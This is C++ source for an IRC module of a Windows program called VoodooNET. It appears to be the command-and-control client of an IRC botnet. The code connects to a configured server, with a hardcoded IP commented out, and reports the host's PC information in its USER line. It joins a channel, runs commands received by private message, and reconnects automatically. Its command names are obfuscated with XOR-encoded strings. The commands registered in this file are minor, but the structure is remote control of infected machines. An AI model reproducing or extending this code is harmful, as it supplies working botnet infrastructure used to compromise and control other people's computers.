/*
 *  VoodooNET - a modular multi-threded program for Windows x86/x64 bit
 *	Coded by VoRTeCKZ - @therealvorteckz
 *  VoRTeCKZ Studios
 *
 *	Copyright (C) 2023 - All Rights Reserved.
 *
 * Permission to ("use, copy, and/or modify"), but not ("distribute or rebrand") this software for
 * any purpose  with or without fee is hereby granted, provided that the above copyright
 * notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
 * PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
 * ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 */

#include "includes.h"
#include "config.h"
#include "cAstro.h"
 //#define server "192.99.92.223"

cAstro::cAstro()
{

	m_bRunning = true;
	m_bConnected = false;


}

bool cAstro::HandleCommand(char* cmd, char* params, ...)
{
	list<command*>::iterator ic;
	int iCount = 0;
	cString m_sCmd(cmd);
	cString m_sParam(params);
	for (ic = g_cVoodoo->m_cCommands.m_lCommands.begin(); ic != g_cVoodoo->m_cCommands.m_lCommands.end(); ++ic)
	{
		iCount++;
		if (!m_sCmd.CompareNoCase((*ic)->sName.c_str()))
		{
#ifdef _DEBUG
			g_cVoodoo->m_cLogging.PrintLine("cCommands:RegisteredCommand", "Registered Command: [Command: %s] [Description: %s]", (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif
#ifndef NO_IRC
			g_cVoodoo->m_cIRC.sendmsg("[cCommands]: Registered Command: [Command %d]: %s] [Description: %s]", iCount, (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif
#ifndef NO_ASTRO
			g_cVoodoo->m_cAstro.sendmsg("04[15cCommands04]:00 Registered Command: 04[15CommandNum:00 %d04]:00 %s04] [15Description: 00%s04]", iCount, (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif
		}
	}
	if (!m_sCmd.Compare(g_cVoodoo->m_cXORCipher.XORCipherDecrypt("4a0a0c5c4d110c19", "#xor").c_str()))
	{
#ifndef NO_ASTRO
		g_cVoodoo->m_cAstro.SendRaw("NICK :%s\r", m_sParam.Str());
#endif
	}


	if (!m_sCmd.Compare(g_cVoodoo->m_cXORCipher.XORCipherDecrypt("4a0a0c5c501d01164e0b08", "#xor").c_str()))
	{
#ifndef NO_ASTRO
		g_cVoodoo->m_cAstro.sendmsg("%s", m_sParam.CStr());
#endif
	}
	if (!m_sCmd.Compare(g_cVoodoo->m_cXORCipher.XORCipherDecrypt("4a0a0c5c57171f1b40", "#xor").c_str()))
	{
#ifndef NO_ASTRO
		g_cVoodoo->m_cAstro.SendRaw("TOPIC %s :%s\r\n", channel, m_sParam.Str());
#endif
	}
	return true;

}


cAstro::~cAstro()
{


}
#define PING_TIMEOUT2 300
DWORD m_lLastRecv;

DWORD WINAPI AstroPingTimeoutThread(LPVOID param)
{
	NTHREAD timeout = *((NTHREAD*)param);
	NTHREAD* timeouts = (NTHREAD*)param;
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.Print("IRC:Ping", "Ping Timeout Check Thread");
#endif
	//dwLastRecv = GetTickCount64();
	while (1)
	{
		if (((GetTickCount64() / 1000) - (m_lLastRecv / 1000)) > PING_TIMEOUT2)
		{
#ifdef _DEBUG
			g_cVoodoo->m_cLogging.PrintLine("IRC:Ping", "Lost Connection... resetting");
#endif
#ifndef NO_ASTRO
			g_cVoodoo->m_cAstro.m_bConnected = FALSE;
			g_cVoodoo->m_cAstro.m_cSocket.Disconnect();

			g_cVoodoo->m_cAstro.m_cSocket.ClearSocket();
			g_cVoodoo->m_cThread.ClearThread(timeout.threadnum);
			g_cVoodoo->m_cAstro.Run();
#endif
			ExitThread(0);
		}
		Sleep(PING_TIMEOUT2 * 1000);
	}
	ExitThread(0);
}

bool cAstro::Run()
{


	try
	{
		//while (g_cVoodoo->m_bRunning) {
		//	if (!g_cVoodoo->m_bRunning) break;
		m_bRunning = true;
		while (m_bRunning)
		{



			if (!m_cSocket.Connect(server, iPort))
			{
				m_bConnected = false; m_cSocket.Disconnect(); m_cSocket.ClearSocket();
				Sleep(15000);
				Run();
			}

			if (!m_bConnected) {
				SendRaw("USER %s * 0 0 :%s\r\n", g_cVoodoo->m_cServer.CreateName(), g_cVoodoo->m_cServer.CreateName());
				SendRaw("NICK :%s\r\n", g_cVoodoo->m_cServer.CreateName());
				Sleep(3000);
			}

			bool bRecvd = false;
			char szLine[8192]; memset(szLine, 0, sizeof(szLine) - 1);
			bRecvd = m_cSocket.RecvLineIRC(szLine, sizeof(szLine) - 1);

			if (bRecvd) {
				cString sLine(szLine);

#ifdef _DEBUG
				g_cVoodoo->m_cLogging.PrintLine("IRC:Recv", "%s", sLine.CStr());
#endif

				m_lLastRecv = (DWORD)GetTickCount64();
				if (!m_bConnected) {
					Sleep(1000);
#ifndef NO_ASTRO
					g_cVoodoo->m_cAstro.SendRaw("USER %s 0 * :%s\n", g_cVoodoo->m_cServer.CreateName(), GetPCInfo());
					g_cVoodoo->m_cAstro.SendRaw("NICK :%s\n", g_cVoodoo->m_cServer.CreateName());
#endif
					m_bConnected = true;
					DWORD id;
					NTHREAD timeout;
					char str_ping_thread[] = "Ping Timeout Thread";
					timeout.threadnum = g_cVoodoo->m_cThread.AddThread(PING_THREAD, str_ping_thread, "AstroPingTimeOutThread");
					if (threads[timeout.threadnum].tHandle = CreateThread(NULL, 0, &AstroPingTimeoutThread, (LPVOID)&timeout, 0, &id)) {

					}
					Sleep(50); // rest to prevent throttle

				}

				if (!sLine.Token(0, " ").Compare("PING"))
				{

#ifndef NO_ASTRO
					g_cVoodoo->m_cAstro.SendRaw("PONG %s\r\n", sLine.Token(1, " ").CStr());
#endif
					m_bConnected = true;

				}
				if (!sLine.Token(0, " ").Compare("ERROR"))
				{


					m_bConnected = false; m_cSocket.Disconnect(); m_cSocket.ClearSocket();
					Sleep(15000);
					Run();

				}
				else if (!sLine.Token(1, " ").Compare("376")) {

					SendRaw("JOIN :%s\r\n", channel);
				}
				else if (!sLine.Token(1, " ").Compare("422"))
				{
#ifndef NO_ASTRO
					g_cVoodoo->m_cAstro.SendRaw("JOIN %s\r\n", channel);
#endif
				}	 if (!sLine.Token(1, " ").CompareNoCase("PRIVMSG"))
				{
					CMessage* pmsg = new CMessage;
					pmsg->sSrc.Assign(sLine.Token(0, ":").Token(0, " ").Token(0, "!"));
					pmsg->sIdentd.Assign(sLine.Token(1, "!").Token(0, "@"));
					pmsg->cHost.Assign(sLine.Token(1, "@").Token(0, " "));
					pmsg->sDest.Assign(sLine.Token(2, " "));

					cString szText = strstr(sLine.CStr(), sLine.Token(1, ":").Token(0, " ").Token(0, " ").CStr());
					//pmsg->sChatString.Assign(strstr(sLine.Str(), " :"));
					//char* szText = pmsg->sChatString.Str();
					pmsg->sCmd.Assign(sLine.Token(1, ":").Token(0, " "));
					//pmsg->sParameters.Assign(sLine.Token(1, ":").Token(1, " "));

					pmsg->sParameters.Assign(strstr(szText.CStr(), szText.Token(1, " ")));
					if (!pmsg->sParameters.Compare(pmsg->sCmd.CStr()))
					{
						pmsg->sParameters.Empty();
						pmsg->sParameters.Assign("");
					}
#ifdef _DEBUG
					//		g_cVoodoo->m_cLogging.Print("IRC:DBG", "test: nick[%s] | ident[%s] | host[%s] | chan[%s] | [cmd: %s] | [parameters: %s]\r\n", pmsg->sSrc.CStr(), pmsg->sIdentd.CStr(),/ pmsg->cHost.CStr(), pmsg->sDest.CStr(), pmsg->sCmd.CStr(), pmsg->sParameters.CStr());
#endif

					command* pCommand = g_cVoodoo->m_cCommands.FindCommand(pmsg->sCmd.CStr());
					if (pCommand) return pCommand->cHandle->HandleCommand(pmsg->sCmd.Str(), pmsg->sParameters.Str()); else return false;

				}
			}
			Sleep(50);
		}


		Sleep(1500);
	}



	catch (...)
	{
		Run();
	}




	return false;
}

bool cAstro::sendmsg(const char* fmt, ...)
{
	va_list va_alist; char formatbuf[512]; va_start(va_alist, fmt);
	vsnprintf(formatbuf, sizeof(formatbuf), fmt, va_alist);

	va_end(va_alist);


	SendRaw("PRIVMSG %s :%s\r\n", channel, formatbuf);
	return true;
}
bool cAstro::SendRaw(const char* szFmt, ...)
{

	//g_cVoodoo->m_cLogging.Print("dbg", "%s", szFmt);

	va_list va_alist; char formatbuf[1024]; va_start(va_alist, szFmt);
	vsnprintf(formatbuf, sizeof(formatbuf), szFmt, va_alist);

	va_end(va_alist);
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.PrintLine("IRC:Send", "%s", formatbuf);
#endif
	if (!m_cSocket.Write(formatbuf, (int)strlen(formatbuf), 0))
	{
		m_bConnected = false; m_cSocket.Disconnect();
		return false;
	}
	else return true;
}




DWORD WINAPI AstroThread(LPVOID param)
{
	//	NTHREAD serverdaemonthreads = *((NTHREAD*)param);
	//	NTHREAD* serverdaemonthread = (NTHREAD*)param;


	NTHREAD astrothreads = *((NTHREAD*)param);
	NTHREAD* astrothread = (NTHREAD*)param;
	while (1)
	{
#ifndef NO_ASTRO
		g_cVoodoo->m_cAstro.Run();
#endif
		Sleep(50);
	}
	//	g_cVoodoo->m_cServer.Init();
	ExitThread(0);
}
void cAstro::Init()
{
	ADDCMD(m_cmdIRCName, g_cVoodoo->m_cXORCipher.XORCipherDecrypt("4a0a0c5c4d110c19", "#xor").c_str(), "Change Name", this);
	ADDCMD(m_cmdSendMsg, g_cVoodoo->m_cXORCipher.XORCipherDecrypt("4a0a0c5c501d01164e0b08", "#xor").c_str(), "Send Msg", this);
	ADDCMD(m_cmdTopic, g_cVoodoo->m_cXORCipher.XORCipherDecrypt("4a0a0c5c57171f1b40", "#xor").c_str(), "Changes Topic", this);

	ADDMODULE(m_cAstroModule, "cAstro", "0.1", "Astro IRC 2.0 Module");

	//	while (1)
	//	{

	DWORD id;
	int i = 0;

	NTHREAD astrothread;

	//NTHREAD tlist;
	//	}
	astrothread.threadnum = g_cVoodoo->m_cThread.AddThread(ASTRO_THREAD, str_astro_thread, "AstroThread");
	threads[astrothread.threadnum].tHandle = CreateThread(NULL, 0, &AstroThread, (LPVOID)&astrothread, 0, &id);

	threads[astrothread.threadnum].PFLAG = TRUE;
	//g_cVoodoo->m_cLogging.Print("cThread:DEBUG1", "[Name: %s]", threads[threadlist.threadnum].tHandle);


//return;


}

